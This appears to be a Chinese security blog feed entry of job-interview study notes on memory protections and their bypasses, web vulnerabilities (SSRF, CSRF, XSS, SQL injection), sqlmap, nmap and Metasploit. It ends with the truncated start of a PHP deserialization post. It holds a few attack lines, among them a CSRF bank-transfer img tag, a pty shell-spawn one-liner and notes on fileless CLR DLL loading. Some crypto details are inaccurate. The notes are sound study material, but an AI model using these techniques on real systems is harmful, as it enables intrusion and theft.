    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>冲一波春招吧，希望能得偿所愿！找了找别人的面经，押个题先！</p><h1 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h1><table><thead><tr><th align="center">堆</th><th align="center">栈</th></tr></thead><tbody><tr><td align="center">一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收</td><td align="center">由操作系统（编译器）自动分配释放</td></tr><tr><td align="center">堆是由new分配的内存，一般速度比较慢，而且容易产生内存碎片</td><td align="center">栈由系统自动分配，速度较快</td></tr><tr><td align="center">分配方式类似于链表</td><td align="center">操作方式类似于数据结构中的栈</td></tr><tr><td align="center">存放使用new创建的对象，全局变量</td><td align="center">存放基本数据类型的变量数据 和 对象的引用，局部变量</td></tr><tr><td align="center">首先应该知道操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆结点，然后将该结点从空闲结点链表中删除，并将该结点的空间分配给程序</td><td align="center">只要栈的剩余空间大于所申请空间，系统将为程序提供内存，否则将报异常提示栈溢出。</td></tr><tr><td align="center">在Windows下,栈是向低地址扩展的数据结构，是一块连续的内存的区域。这句话的意思是栈顶的地址和栈的最 大容量是系统预先规定好的，如果申请的空间超过栈的剩余空间时， 将提示overflow</td><td align="center">堆是向高地址扩展的数据结构，是不连续的内存区域，堆的大小受限于计算机系统中有效的虚拟内存。</td></tr></tbody></table><p>一般认为在c中分为这几个存储区<br>1栈 - 由编译器自动分配释放<br>2堆 - 一般由程序员分配释放，若程序员不释放，程序结束时可能由OS回收<br>3全局区（静态区），全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。 程序结束释放。<br>4另外还有一个专门放常量的地方。 - 程序结束释放<br>在函数体中定义的变量通常是在栈上，用malloc, calloc, realloc等分配内存的函数分配得到的就是在堆上。在所有函数体外定义的是全局量，加了static修饰符后不管在哪里都存放在全局区（静态区）,在所有函数体外定义的static变量表示在该文件中有效，不能extern到别的文件用，在函数体内定义的static表示只在该函数体内有效。</p><h1 id="壳-加壳-脱壳"><a href="#壳-加壳-脱壳" class="headerlink" title="壳 加壳 脱壳"></a>壳 加壳 脱壳</h1><p>“壳”是一段先丁被保护的程序运行的一段程序，它们附加在原程序上通过Windows加载器载入内存后，先于原始程序执行，得到控制权，执行过程中对原始程序进行解密，还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分’<br>根据实现的功能。<br>从某种意义上来说，某些木马病毒也是实现了相似的功能，即修改入口点然后在执行完了功能后在到原本程序的入口点。<br>脱壳方法有两种<br>第一种是硬脱壳，这是指找出加壳软件的加壳算法，写出逆向算法，就像压缩和解压缩一样。由于，目前很多“壳”均带有加密、变形的特点，每次加壳生成的代码都不一样。硬脱壳对此无能为力，但由于其技术门槛较低，仍然被一些杀毒软件所使用。<br>第二种是动态脱壳。由于加壳的程序运行时必须还原成原始形态，即加壳程序会在运行时自行脱掉“马甲”。目前，有一种脱壳方式是抓取（Dump）内存中的镜像，再重构成标准的执行文件。相比硬脱壳方法，这种脱壳方法对自行加密、变形的壳处理效果更好。<br>常见的加密壳有UPX、ASPACK等</p><h1 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h1><p>堆栈平衡就是call完了之后ret时sp要指向call之前的下一条指令。<br>在call时会先将当前的ip内容（或者说下一条要执行的指令的地址）压栈，如果堆栈不平衡，ret的时候会pop ip，这就导致程序去了奇怪的地方执行奇怪的代码（或许连代码都8是，但是被硬当做代码了）。一般情况下的堆栈平衡主要是整sp和bp这两个确定堆栈的指针。在call一个函数的时候，调用者首先把参数压入堆栈，然后调用子程序，在完成后，由于堆栈中先前压入的数不再有用，调用者或者被调用者必须有一方把堆栈指针修正到调用前的状态。假如我调用了一个add(int a, intb)有2个参数，在call之前就会push a和push b 因此需要给sp增加0x8才能保证堆栈平衡，这个add sp 0x8的操作一般在经过编译的函数里实现，如果直接手撸汇编则需要手写add sp 0x8才行，只有堆栈平衡了，这个call不会发生奇怪的事情。</p><h1 id="简述恶意代码分析"><a href="#简述恶意代码分析" class="headerlink" title="简述恶意代码分析"></a>简述恶意代码分析</h1><p>首先用在线沙箱确定确实是一个恶意程序。<br>恶意代码分析分为静态分析和动态分析两个步骤。<br>静态分析主要先查看其输入函数，以初步判断恶意代码实现了那些恶意功能，比如kernel32.dll的CreateFileA函数等可以断定他有创建文件，advapi32.dll中的注册表相关操作的api和密码相关的api等等。然后对恶意软件进行反编译，根据反编译的结果验证猜想、判断恶意行为。<br>动态分析是指在虚拟机中，开启监视行为的程序，比如process monitor，直接运行恶意代码，监测行为进而确定恶意代码。</p><h1 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a>常见加密算法</h1><p>对称：<br>DES（Data Encryption Standard）：，数据加密标准，速度较快，适用于加密大量数据的场合，分组密码，S盒；<br>3DES（Triple DES）：是基于DES的对称算法，对一块数据用三个不同的密钥进行三次加密，强度更高；<br>RC2和RC4：，用变长密钥对大量数据进行加密，比 DES 快，分组密码，S盒；<br>IDEA（International Data Encryption Algorithm）国际数据加密算法，使用 128 位密钥提供非常强的安全性，分组密码；<br>AES（Advanced Encryption Standard）：高级加密标准，速度快，安全级别高，分组密码；<br>BLOWFISH，它使用变长的密钥，长度可达448位，运行速度很快，分组密码；</p><p>非对称：<br>RSA：支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的；<br>ECC（Elliptic Curves Cryptography）：椭圆曲线密码编码学。<br>TEA(Tiny Encryption Algorithm)简单高效的加密算法，加密解密速度快，实现简单。但安全性不如DES，QQ一直用tea加密，分组密码<br>DSA： 用于数字签名</p><p>摘要：<br>MD5 SHA-1<br>公钥密码体制根据其所依据的难题一般分为三类：大素数分解问题类、离散对数问题类、椭圆曲线类。</p><p>国密对标<br>SM2 椭圆曲线<br>SM4≈DES<br>SM3 摘要算法</p><h1 id="密钥协商"><a href="#密钥协商" class="headerlink" title="密钥协商"></a>密钥协商</h1><p>“密钥协商机制”是：（在身份认证的前提下）规避【偷窥】的风险。通俗地说，即使有攻击者在偷窥客户端与服务器的网络传输，客户端（client）依然可以利用“密钥协商机制”与服务器端（server）协商出一个只有二者可知的用来对于应用层数据进行加密的密钥（也称“会话密钥”）。<br>1，依靠非对称加密算法<br>拿到公钥的一方先生成随机的会话密钥，然后利用公钥加密它，再把加密结果发给对方，对方用私钥解密；于是双方都得到了会话密钥。<br>如 RSA SM2</p><p>2，依靠专门的密钥交换算法<br>DH算法：<br>依据：大素数分解的困难性<br>双方约定两个素数：模数p和生成元g<br>双方各选一个秘密的自然数（a,b），然后计算 $A=g^a mod p$ 和 $B=g^b mod p$作为双方的公钥<br>拿到公钥的另一方计算 $k=A^b mod g$ 和 $k=B^a mod g$ 即得到密钥<br>此算法不支持认证，虽然可以抵抗偷窥但是无法抵抗篡改，无法对抗中间人攻击。一般此算法会配合其余的签名算法搭配使用，比如RSA、DSA算法。</p><p>3，依靠通讯双方事先已经共享的“秘密”<br>即双方在此次密钥协商之前已经共享了某些秘密，只需在这个秘密的基础上进行某种生产算法即可。</p><h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><p>https的加密部分是SSL安全套接字协议/TLS安全传输层协议实现的，他们在应用层和传输层之间，即在会话层和表示层<br>ssl的密钥协商过程如下图<br><img src="/2021/03/05/%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/2.png" alt><br>服务端提供证书供客户端验证<br>服务端提供公钥<br>客户端想一个key，用公钥加密，发给服务端<br>服务端用自己的私钥解密，得到key<br>双方使用key来对称加密。</p><p>https的证书验证机制<br>如下图<br><img src="/2021/03/05/%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/3.png" alt><br>客户端证书其实平时不是很常见，需要验证客户身份的地方也不是很多，主要的例子就是银行的U盾。<br>简化一点的可以如下图<br><img src="/2021/03/05/%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/4.png" alt></p><h1 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a>内存保护</h1><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><p>启用GS选项之后，会在函数执行一开始先往栈上保存一个数据，等函数返回时候检查这个数据，若不一致则为被覆盖，这样就跳转进入相应的处理过程，不再返回，因此shellcode也就无法被执行，这个值被称为“Security cookie”。<br>可是他们忽略了异常处理SEH链也在栈上因此可以覆盖SEH链为jmp esp的地址，之后触发异常跳转到esp执行shellcode。</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>SafeSEH会将所有异常处理函数地址提取出来，编入 SEH 表中，并将这张表放到程序的映像里。异常调用时，就与这张预先存好的表中的地址进行校验。<br>绕过：<br>利用堆地址覆盖SEH结构绕过SafeSEH：在禁用DEP的进程中，异常分发器允许SEH handler位于除栈空间之外的非映像页面。也就是说我们可以把shellcode放置在堆中，然后通过覆盖SEH跳至堆空间以执行shellcode，这样即可绕过SafeSEH保护。<br>利用没有启用SafeSEH保护的模块绕过SafeSEH：老版本的操作系统的系统模块、旧编译器的dll文件可能没有启用SafeSEH，可以用来绕过<br>利用加载模块之外的地址绕过SafeSEH：对于加载模块之外的地址，SafeSEH同样是不进行有效性检测的</p><h2 id="DEP-data-execution-prevent"><a href="#DEP-data-execution-prevent" class="headerlink" title="DEP data execution prevent"></a>DEP data execution prevent</h2><p>数据执行保护（DEP）指的是堆和栈只有读写权限没有执行权限。<br>绕过：如果程序用了kernel32.dll的VirtualProtect函数，则可以改变堆栈段的执行权限<br>或者使用ROP（面对return的编程），在程序可执行段收集类似于</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这样的一个操作+ret的段，这样就可以在堆栈段控制住ip的执行。<br>一般都用插件，比如mona、ropme等（主要手做太麻烦了）</p><h2 id="ASLR（Address-space-layout-randomization）"><a href="#ASLR（Address-space-layout-randomization）" class="headerlink" title="ASLR（Address space layout randomization）"></a>ASLR（Address space layout randomization）</h2><p>ASLR地址空间布局随机化是让exe、dll的地址全都随机，这样就可以抵抗DEP。<br>对抗ASLR的方式是暴力把程序空间占满，全铺上shellcode，只要跳转地址没落在已有模块中，落在我们的空间中即可以执行了shellcode。这种将程序空间全部占满铺上shellcode的技术被称为堆喷射技术，缺无法对抗ASLR+DEP的双重防护。</p><h2 id="Control-Flow-Guard-CFG-——控制流防护"><a href="#Control-Flow-Guard-CFG-——控制流防护" class="headerlink" title="Control Flow Guard(CFG)——控制流防护"></a>Control Flow Guard(CFG)——控制流防护</h2><p>CFG通过在间接跳转(Indirect Call)前插入校验代码（比如 call dword ptr ss:[ebp-8] 等等 ），检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题。</p><h2 id="CANNARY-栈溢出保护"><a href="#CANNARY-栈溢出保护" class="headerlink" title="CANNARY(栈溢出保护)"></a>CANNARY(栈溢出保护)</h2><p>linux下的GS<br>启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p><h2 id="NX-No-eXecute"><a href="#NX-No-eXecute" class="headerlink" title="NX No-eXecute"></a>NX No-eXecute</h2><p>linux下的DEP<br>ret2libc=ROP</p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>linux下的NX+ASLR</p><h2 id="RELRO-read-only-relocation"><a href="#RELRO-read-only-relocation" class="headerlink" title="RELRO read only relocation"></a>RELRO read only relocation</h2><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation.大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.<br>RELRO设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p><h1 id="用于伪造的HTTP头"><a href="#用于伪造的HTTP头" class="headerlink" title="用于伪造的HTTP头"></a>用于伪造的HTTP头</h1><p>Referer 告诉服务器该页面从哪个页面链接的（ssrf）<br>X-forward-for 用来表示 HTTP 请求端真实 IP（如果有代理就挨个往后写），可以用于伪造ip（Remote address无法伪造）<br>User-agent 向服务器发送浏览器的版本、系统、应用程序的信息</p><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。<br>ssrf可以做到<br>1.内外网的端口和服务扫描<br>2.主机本地敏感数据的读取<br>3.内外网主机应用程序漏洞的利用<br>4.内外网Web站点漏洞的利用</p><p>例子<br>1、利用file协议读取文件<br>2、利用dict协议查看端口开放<br>3、利用gopher协议反弹shell</p><p>造成原因<br>1、curl<br>2、file_get_contents<br>3、fsockopen</p><p>修复方案：<br>限制协议为HTTP、HTTPS<br>不用限制302重定向<br>设置URL白名单或者限制内网IP</p><h1 id="csrf-cross-site-request-forgery-跨站脚本伪造"><a href="#csrf-cross-site-request-forgery-跨站脚本伪造" class="headerlink" title="csrf cross-site request forgery 跨站脚本伪造"></a>csrf cross-site request forgery 跨站脚本伪造</h1><p>攻击者盗用了你的身份，以你的名义发送恶意请求。<br>比如你在A站生成了一个cookie，然后你访问了B站，B站让你往A站发请求，而浏览器会自己读取cookie，A站就以为是你本人发的<br>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等<br>造成的问题包括：个人隐私泄露以及财产安全。</p><p>要完成一次CSRF攻击，受害者必须依次完成两个步骤：<br>1.登录受信任网站A，并在本地生成Cookie。<br>2.在不登出A的情况下，访问危险网站B。</p><p>例子：<br>1、在危险B站有一个<code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code>的标签<br>2、B站有一段恶意js代码，实现了恶意功能，并且body有onload执行这个恶意代码</p><p>防御：<br>服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。<br>1、Cookie Hashing(所有表单都包含同一个伪随机值)：因为攻击者不能获得第三方的Cookie(理论上)、<br>在表单里增加Hash值，以认证这确实是用户发送的请求，并用hidden_type，然后在服务器端进行Hash值验证<br>2、验证码：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串</p><h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容）<br>存储型XSS：&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行<br>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p><p>存储型XSS需要先把利用代码保存在比如数据库或文件中，当web程序读取利用代码时再输出在页面上执行利用代码。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。</p><p>防御<br>A.PHP直接输出html的，可以采用以下的方法进行过滤：<br>1.htmlspecialchars函数转义<code>&amp;&quot;&#39;&lt;&gt;``2.htmlentities函数：对用户输入的</code>&lt;&gt;`做了转义处理<br>3.HTMLPurifier.auto.php插件<br>4.RemoveXss函数</p><p>B.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：<br>1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容<br>2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</p><p>C.其它的通用的补充性防御手段<br>1.在输出html时，加上Content Security Policy的Http Header<br>（作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）<br>（缺陷：IE或低版本的浏览器可能不支持）<br>2.在设置Cookie时，加上HttpOnly参数<br>（作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）<br>（缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）<br>3.在开发API时，检验请求的Referer参数<br>（作用：可以在一定程度上防止CSRF攻击）<br>（缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在开发网站的时候，出于安全考虑，需要过滤从页面传递过来的字符。通常，用户可以通过以下接口调用数据库的内容：URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。<br>1：寻找到SQL注入的位置<br>2：判断服务器类型和后台数据库类型<br>3：针对不同的服务器和数据库特点进行SQL注入攻击</p><p>MS-SQL<br>与MySQL不一样的是，联合查询不能直接输入数字，占位符需要使用null<br>@@version，查询当前数据库版本<br>db_name()，查询当前数据库名称<br>user，查询当前用户<br>IS_SRVROLEMEMBER()，查询数据库权限。<br>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>Mysql<br>information_schema<br>使用order by来判断返回的条目的字段数量<br>使用union判断每个字段的显示位置<br>使用database() usr() 等函数获取有用的信息<br>user()是用来显示当前登陆的用户名与它对应的host,currrent_user()是用来显示当前登陆用户对应在user表中的哪一个<br>limit控制显示的条目</p><p>报错注入<br>extractvalue()  updatexml()<br>floor() （floor()、rand()）</p><h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><p>-u 指定目标URL (可以是http协议也可以是https协议)<br>-d 连接数据库<br>–dbs 列出所有的数据库<br>–current-db 列出当前数据库<br>–tables 列出当前的表<br>–columns 列出当前的列<br>-D 选择使用哪个数据库<br>-T 选择使用哪个表<br>-C 选择使用哪个列<br>–dump 获取字段中的数据<br>–batch 自动选择yes<br>–smart 启发式快速判断，节约浪费时间<br>–forms 尝试使用post注入<br>-r 加载文件中的HTTP请求（本地保存的请求包txt文件）<br>-l 加载文件中的HTTP请求（本地保存的请求包日志文件）<br>-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试<br>-o 开启所有默认性能优化<br>–tamper 调用脚本进行注入<br>-v 指定sqlmap的回显等级<br>–delay 设置多久访问一次<br>–os-shell 获取主机shell，一般不太好用，因为没权限<br>-m 批量操作<br>-c 指定配置文件，会按照该配置文件执行动作<br>-data data指定的数据会当做post数据提交<br>-timeout 设定超时时间<br>-level 设置注入探测等级<br>–risk 风险等级<br>–identify-waf 检测防火墙类型<br>–param-del=”分割符” 设置参数的分割符<br>–skip-urlencode 不进行url编码<br>–keep-alive 设置持久连接，加快探测速度<br>–null-connection 检索没有body响应的内容，多用于盲注<br>–thread 最大为10 设置多线程<br>–tamper [“脚本名称”] （一些绕过过滤的脚本，比如用/**/替换空格）</p><h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p>DOS头=MZ文件头+DOSstub（This program cannot be run in DOS mode）</p><p>PE头–可选文件头–定义了PE文件许多的关键信息，入内存镜像加载地址、程序入口点、节在文件和内存中的对齐粒度、程序在内存中的镜像大小、文件大小等等—输入表是记录输入函数相关信息的一张表，他记录了PE文件在运行过程中调用动态链接库的一些函数的名称和地址</p><p>节表<br>代码节<br>数据节<br>引入函数节<br>资源节等(如图标)<br>引出函数节（DLL文件中常见）<br>重定位节（DLL文件中常见）</p><h1 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h1><p>spider intruder repeater </p><h1 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h1><p>-l local<br>向局域网中所有可能的ip地址发出arp请求包，如果得到arp回应，就证明局域网中某台主机使用了该ip</p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>直接加ip<br>-vv参数设置对结果的详细输出<br>-p(range)扫描的端口范围<br>-sP <target ip> <netmask> 利用类似windows/linux系统下的ping 方式进行扫描<br>–traceroute <target ip><br>-O(大写的o) 操作系统探查<br>-A 综合扫描<br>-sV 版本检测<br>-T [0-6]：设置定时模板（越高越快）</target></netmask></target></p><h1 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h1><p>msfconsole<br>search ***<br>use<br>show options<br>set ** **<br>shell<br>python -c ‘import pty;pty.spawn(“/bin/sh”)’模拟tty</p><p>show<br>show auxiliary显示Metasploit中的可用辅助模块列表，这些辅助模块包括scanner、dos、fuzzer等<br>show exploits 显示Metasploit中包含的所有可以利用的攻击类型列表。<br>show payloads 显示Metasploit中可以在不同平台中可以在远程主机执行的代码<br>show options 显示可利用模块exploit的设置、条件、描述等。在具体的模块中使用，后面use命令中会有实例。<br>show targets 显示可利用模块exploit支持的目标类型（操作系统、软件版本等）。<br>show advanced 显示可利用模块exploit高级信息，自定义利用程序时使用。<br>show encoders 显示可利用模块exploit的编码方式，在具体的模块中使用，后面set命令中会有实例。</p><h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>readfile()、file_get_contents()、fopen()如果参数没有经过校验或校验不合格，用户就可以控制变量读取任意文件。</p><h1 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h1><p>通过参数传递下载文件的位置，且对参数没有严格过滤，即可利用。与任意文件读取异曲同工。<br>也可以直接自己构造</p><h1 id="MSSQL-sql存储过程和CLR存储过程区别"><a href="#MSSQL-sql存储过程和CLR存储过程区别" class="headerlink" title="MSSQL sql存储过程和CLR存储过程区别"></a>MSSQL sql存储过程和CLR存储过程区别</h1><p>CLR负责应用程序在整个执行期间的代码管理工作，比较典型的有：内存管理、线程管理、安全管理、远程管理、即使编译、代码强制安全类检查等<br>简单说，通过 CLR 能够在 SQLServer 中注册一套程序集，实现执行任意的 .NET 代码。并且由于CLR 注册 DLL 支持十六进制的方式，以这种方式不需要将 DLL 文件落地到目标机器上，实现了无文件落地，能够规避杀软。此外，在目标无法处出网的情况下，也能完成操作</p><p>sql存储过程: 直接同DB服务器更新交互<br>clr存储过程:需要采用ado.net的方式提交sql至db服务器<br>sql 存储过程:只需一个sql脚本就可以运行相关操作，就可以将数据返回给客户端<br>clr存储过程:需要通过sqlpipe对象将结果返回客户端</p><h1 id="看过工具源码吗"><a href="#看过工具源码吗" class="headerlink" title="看过工具源码吗"></a>看过工具源码吗</h1><p>看过githack和gakki改的gitextract<br>githack<br>解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )<br>他用了一个别人写的praser来遍历index，具体方法有点不太记得了，基本上就是吧.git/index按他的字节格式一个一个的解析下来的，就一次读几个字节然后这几个字节应该是什么意思那样。当时我还想哪天去总结一下这个.git/index的格式来着，这两天一定。<br>去.git/objects/ 文件夹下下载对应的文件，用了create_unverified_context来实现ssl<br>zlib解压文件，按原始的目录结构写入源代码</p><p>gitextract<br>不仅解析了index，还解析了head等等好几项，基本上也是按照字节格式解析的。</p><h1 id="断点原理"><a href="#断点原理" class="headerlink" title="断点原理"></a>断点原理</h1><p>直接改写断点内存地址的第一个字节，替换为int3 (0xcc，软中断机制)，并保存原始字节至OD维护的一张断点表处</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>Java：自动调用readobject（）方法<br>php:自动调用<strong>wakeup()方法<br>Python： 自动调用</strong>reduce__()方法</p><h1 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h1><p>两个队列：系统消息队列和应用消息队列<br>一个链：hook链<br><img src="/2021/03/05/%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/5.png" alt></p><h1 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h1><p>C++基类里定义的方法，子类可以在自己那儿做出自己的实现<br>纯虚函数就是一定要自己实现</p><p>参考<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxNzYzMTU0Ng==&amp;mid=2651289202&amp;idx=1&amp;sn=431ffd1fae4823366a50b68aed2838d4&amp;chksm=80114627b766cf31f72018ef5f1fe29591e9f6f4bd72018e7aea849342ca6f0a271fb38465ae#rd">https://mp.weixin.qq.com/s?__biz=MzAxNzYzMTU0Ng==&amp;mid=2651289202&amp;idx=1&amp;sn=431ffd1fae4823366a50b68aed2838d4&amp;chksm=80114627b766cf31f72018ef5f1fe29591e9f6f4bd72018e7aea849342ca6f0a271fb38465ae#rd</a><br><a href="https://blog.csdn.net/m0_37552052/article/details/81453591">https://blog.csdn.net/m0_37552052/article/details/81453591</a><br><a href="https://www.jianshu.com/p/4fcb4b411a66">https://www.jianshu.com/p/4fcb4b411a66</a><br><a href="https://cloud.tencent.com/developer/article/1736431">https://cloud.tencent.com/developer/article/1736431</a><br><a href="https://www.cnblogs.com/Rev-omi/p/14027780.html">https://www.cnblogs.com/Rev-omi/p/14027780.html</a><br><a href="https://www.jianshu.com/p/4f89f810d98e">https://www.jianshu.com/p/4f89f810d98e</a><br><a href="https://blog.csdn.net/x_nirvana/article/details/61420056">https://blog.csdn.net/x_nirvana/article/details/61420056</a><br><a href="https://www.cnblogs.com/makelu/p/11140824.html">https://www.cnblogs.com/makelu/p/11140824.html</a><br><a href="https://www.cnblogs.com/tuyile006/p/10873975.html">https://www.cnblogs.com/tuyile006/p/10873975.html</a><br><a href="https://blog.csdn.net/qq_41137136/article/details/86434796">https://blog.csdn.net/qq_41137136/article/details/86434796</a><br><a href="https://blog.csdn.net/he_and/article/details/85224548">https://blog.csdn.net/he_and/article/details/85224548</a><br><a href="https://www.nowcoder.com/discuss/111857?type=0&amp;order=0&amp;pos=28&amp;page=0">https://www.nowcoder.com/discuss/111857?type=0&amp;order=0&amp;pos=28&amp;page=0</a><br><a href="https://blog.csdn.net/qianqin_2014/article/details/51114105">https://blog.csdn.net/qianqin_2014/article/details/51114105</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="https://blog.pillar.fun/2021/03/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://blog.pillar.fun/2021/03/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-03T14:38:08.000Z</published>
    <updated>2021-03-03T18:20:19.825Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>PHP反序列化是PHP代码审计中非常重要且有必要的一部分，今天由我来总结整合一下~</p><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p>PHP反序列化漏洞是PHP在反序列化过程中对输入的数据处理不当造成的。在PHP反序列化的过程中，类中或许会有一些魔术方法（magic methods），在反序列化操作执行的时候会自动执行，而其中如果有包含参数的危险操作，就会引起PHP反序列化漏洞。</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>做过一些网络编程的同学们应该都有过这样的体验，比如客户端和服务端都需要使用某个对象，而通过网络流发送对象首先就是要将他们变成流，这个过程就是序列化，从流中还原出原本的对象的过程就是反序列化。当然，转为json和xml的传输也是序列化。在PHP中，分别用serialize()和unserialize()函数实现序列化和反序列化。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在PHP中内置了一些以两个下划线开头的函数，他们会在特定的操作时自动的执行。php内置的魔术方法见<a href="https://www.php.net/manual/zh/language.oop5.magic.php">手册</a><br>例如__construct()函数在我们新建一个类的对象时自动执行。</p><h2 id="出现问题的地方"><a href="#出现问题的地方" class="headerlink" title="出现问题的地方"></a>出现问题的地方</h2><p>unserialize（）函数中，比较需要特别注意的魔术方法是<strong>destruct()和</strong>wakeup()函数。<br>通过手册，我们可以知道，<strong>destruct()函数在对象被销毁时自动执行，而</strong>wakeup()函数在反序列化操作开始时自动执行，用以预先准备对象需要的资源。可以说这两个函数在反序列化过程中必被执行，如果这两个函数中有危险的动作，后果不堪设想。</p><h2 id="危险的动作"><a href="#危险的动作" class="headerlink" 